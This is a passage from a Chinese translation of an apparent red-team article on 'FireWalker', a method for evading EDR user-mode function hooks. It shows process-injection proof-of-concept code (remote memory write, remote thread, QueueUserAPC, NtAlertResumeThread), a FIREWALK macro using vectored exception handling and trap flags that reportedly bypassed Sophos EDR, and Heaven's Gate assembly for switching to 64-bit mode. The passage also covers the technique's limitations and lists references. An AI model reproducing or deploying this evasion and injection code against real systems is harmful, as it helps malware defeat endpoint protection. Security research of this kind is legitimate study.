        NULL
    );

    if(!hRemoteThread)
    `{`
        printf("Unable to create remote thread\n");
        return 1;
    `}`

    printf("About to queue APC\n");
    getchar();

    if (!QueueUserAPC((PAPCFUNC)lpvRemote, hRemoteThread, NULL))
    `{`
        printf("QueueUserAPC failed\n");
        return 1;
    `}`

    printf("About to NtAlertResumeThread\n");
    getchar();

    ULONG ulSC = 0;

    if (NtAlertResumeThread(hRemoteThread, &amp;ulSC) != 0)
    `{`
        printf("NtAlertResumeThread failed\n");
        return 1;
    `}`

    printf("Done\n");
```

上述代码利用`VirtualAllocEx`和`WriteProcessMemory`函数，注入可执行的Payload（存储在rgbPayload，注入到远程进程中），然后使用APC（通过`CreateRemoteThread`和`QueueUserAPC`）创建远程线程并执行，最后释放线程，使其在迅速终止之前使用`NtAlertResumeThread`唤醒并执行所有排队的APC。

请注意，假设`CreateRemoteThread`成功，那么在这个进程中就完全不必再使用APC（即`QueueUserAPC`）了，因为它可以直接用于执行写入目标进程的代码。我们希望EDR能够检测到这个行为，因此我们使用了上面的实现方式。

之所以选择Sophos EDR来进行PoC的验证，是因为我们发现该产品仅对一些有限的函数进行挂钩，并在WoW64进程中挂钩了32位API。执行PoC将会导致应用程序迅速终止，并出现以下错误：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01437f6114a42c550f.png)

检查控制台的输出后发现，对`QueueUserAPC`的调用触发了检测：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0116a6ab5f9b65282c.png)

为了测试FireWalker对于Sophos EDR是否有效，我们需要像之前在调用`CreateProcess`时所做的那样，将对`QueueUserAPC`的调用包装在`AddVectoredExceptionHandler/Trap`等调用中。<br>
为了使FireWalker的使用过程更加方便，我创建了一个简单的FIREWALK宏，来自动实现以下步骤：

```
#define FIREWALK(call)    \
    [&amp;]()`{` \
    HANDLE veh = AddVectoredExceptionHandler(1, TrapFilter); \
    Trap(); \
    auto r = call; \
    Untrap(); \
    RemoveVectoredExceptionHandler(veh); \
    return r; \
    `}`()
```

函数调用包装如下：

```
if (!FIREWALK(QueueUserAPC((PAPCFUNC)lpvRemote, hRemoteThread, NULL)))
    `{`
        printf("QueueUserAPC failed\n");
        return 1;
    `}`
```

使用这个包装器编译PoC，会得到以下结果：

[![](https://p0.ssl.qhimg.com/t014e67cd8c6381491f.png)](https://p0.ssl.qhimg.com/t014e67cd8c6381491f.png)

最终，Payload成功执行（弹出计算器），说明已经对Sophos用户层挂钩实现了逃避。



## 0x05 后续改进

遗憾的是，我们在本文中所描述的FireWalker技术还有一些缺点，所以它距离绕过EDR函数挂钩的理想方案还有差距。

首先，在每条指令之前执行`TrapFilter`函数会使跟踪代码的性能降低许多数量级。对于不经常执行的任务（例如：进程创建、远程进程内存操作、线程创建等），可以接受性能的降低，但对于总体来说，还是对运行速度产生了明显的影响，这种方式不能用于每个函数调用上，还需要更加谨慎地使用。但是，如果将其加入到红队的通用工具（例如加载工具、初始访问Payload、注入工具），这一点性能差异可能就会被忽略。

要解决这一问题，可能需要采用分支跟踪，而不是单步执行，但是我发现这个功能无法在Windows 10中按照预期工作。在进一步调查中，我发现在设置适当的调试寄存器标志（DR7的第8-9位）后，操作系统没有按照要求将Last Branch值（指向分支指令的指针）提供给异常处理程序。如果没有这个指针，用于确定是否正在执行挂钩函数的启发式方法会变得更加复杂，并且可能会变得不可靠。

第二个问题是，FireWalker无法以当前形式跟踪到64位函数，这意味着不会跟踪安装在64位代码（包括调度实际系统调用的代码）上的任何挂钩。

可以通过以下方法解决此问题，手动将处理器切换到64位模式，安装向量异常处理程序并重新启用陷阱标志。这需要`TrapFilter`函数的重复实现，以处理64位指令。同时，还需要实现向32位模式的转换。

用于处理转换的代码（可以编译为32位内联汇编）如下所示：

```
DECLSPEC_NOINLINE __declspec(naked) void Enter64(DWORD zero = 0)
`{`
    __asm
    `{`
        push 0x33
        call here
    `}`
here:
    __asm
    `{`
        sub dword ptr [esp], -5
        retf
        ret
    `}`
`}`

DECLSPEC_NOINLINE __declspec(naked) void Leave64(DWORD zero = 0)
`{`
    __asm
    `{`
        call here
    `}`
here:
    __asm
    `{`
        sub dword ptr[esp], -10
        add dword ptr[esp + 4], 0x23
        retf
        ret 4
    `}`
`}`

```

由于无法在Visual Studio中使用C++编译混合的x86和x64汇编代码，因此要实现这个功能会非常复杂，需要一个外部编译器来编译提供`TrapFilter`的64位实现并安装VEH所需的代码。

第三个问题在于，一些EDR产品（例如Cylance）通过将整个函数复制到新的内存段的方式，来实现对较小函数的挂钩，例如`Nt *`函数实现，而不仅仅是挂钩函数。然后，EDR执行这个函数的私有副本，所以也就不存在任何可以轻松识别执行和重定向到的thunk。在这种情况下，需要针对特定产品进行定制，才能成功绕过。

对于具有明显不同主体的函数，可以通过将挂钩jmp之后的字节与位于其他位置的可执行内存中的顺序进行比较，来识别出函数的副本，这时就不能再通过跳转到挂钩函数的jmp来识别了。但遗憾的是，许多常见的挂钩目标函数（例如`Nt *` API）仅在前半个字节左右有所不同，因此使用这种方法很难唯一识别出来。



## 0x06 总结

FireWalker技术适用于红队在预先不清楚目标EDR厂商的情况下，逃避函数挂钩，并为用户提供了编写某种与挂钩无关的代码的方法。为了让这一技术同样适用于64位平台，还需要开展进一步的研究和改进，并进一步考虑通过复制整个目标的方法来绕过EDR，而不能再使用跳回原始函数的方法。

此外，从识别和调用较低级别`Nt *` API的方法来看，搜索内存中是否有thunk的代码可能会让我们有所收获，这里就不用再从磁盘重新加载/读取`ntdll.dll`模块的进程。毫无疑问，这在以后会成为EDR检测的一个指标。

我们已经在MDSec ActiveBreach GitHub上开源了FireWalker库。



## 0x07 参考资料

[1] [https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)<br>
[2] [https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking](https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking)<br>
[3] [https://www.codeproject.com/Articles/737907/Taking-advantage-of-Windows-Hot-Patching-mechanism](https://www.codeproject.com/Articles/737907/Taking-advantage-of-Windows-Hot-Patching-mechanism)<br>
[4] [https://frida.re/](https://frida.re/)<br>
[5] [https://github.com/microsoft/Detours](https://github.com/microsoft/Detours)<br>
[6] [https://www.first.org/resources/papers/telaviv2019/Ensilo-Omri-Misgav-Udi-Yavo-Analyzing-Malware-Evasion-Trend-Bypassing-User-Mode-Hooks.pdf](https://www.first.org/resources/papers/telaviv2019/Ensilo-Omri-Misgav-Udi-Yavo-Analyzing-Malware-Evasion-Trend-Bypassing-User-Mode-Hooks.pdf)<br>
[7] [https://blog.amossys.fr/windows10_TH2_int2E_mystery.html](https://blog.amossys.fr/windows10_TH2_int2E_mystery.html)<br>
[8] [https://github.com/j00ru/windows-syscalls](https://github.com/j00ru/windows-syscalls)<br>
[9] [https://github.com/Microwave89/createuserprocess/](https://github.com/Microwave89/createuserprocess/)<br>
[10] [https://www.a1logic.com/2012/10/23/single-step-debugging-explained/](https://www.a1logic.com/2012/10/23/single-step-debugging-explained/)<br>
[11] [http://www.openrce.org/blog/view/535/Branch_Tracing_with_Intel_MSR_Registers](http://www.openrce.org/blog/view/535/Branch_Tracing_with_Intel_MSR_Registers)<br>
[12] [https://www.codeproject.com/Articles/517466/Last-branch-records-and-branch-tracing](https://www.codeproject.com/Articles/517466/Last-branch-records-and-branch-tracing)<br>
[13] [https://docs.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling](https://docs.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling)<br>
[14] [https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms](https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms)<br>
[15] [https://medium.com/%40fsx30/hooking-heavens-gate-a-wow64-hooking-technique-5235e1aeed73](https://medium.com/%40fsx30/hooking-heavens-gate-a-wow64-hooking-technique-5235e1aeed73)<br>
[16] [https://github.com/FuzzySecurity/Sharp-Suite](https://github.com/FuzzySecurity/Sharp-Suite)
